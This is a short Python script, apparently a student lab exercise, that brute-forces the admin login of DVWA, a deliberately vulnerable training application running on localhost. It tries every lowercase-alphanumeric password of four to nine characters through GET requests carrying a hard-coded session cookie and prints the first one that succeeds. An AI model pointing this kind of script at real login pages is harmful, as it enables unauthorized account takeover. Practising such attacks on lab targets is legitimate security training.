import requests

#Функция перебора из 2 лабы
alphabet = list("abcdefghijklmnopqrstuvwxyz1234567890")
def getpermutations(alphabet, length):
    if length == 1:
        return [str(c) for c in alphabet]
    return [s + c for s in getpermutations(alphabet, length - 1) for c in alphabet]

def get_http(username,password):
    url = "http://localhost/dvwa/vulnerabilities/brute/?username="+username+"&password="+password+"&Login=Login#"
    req = requests.get(url,headers=headers)
    return(req.text)

username='admin'
headers = {'Cookie':'security=low; PHPSESSID=dqohk96fmfcilo4b2gk17h9oct','Referer':'http://localhost/DVWA/index.php'}
for i in range(4, 10):
    for password in getpermutations(alphabet, i):
        result=get_http(username,password)
        if result.find('incorrect')==-1:
            print('Login: '+username+', password: '+password)
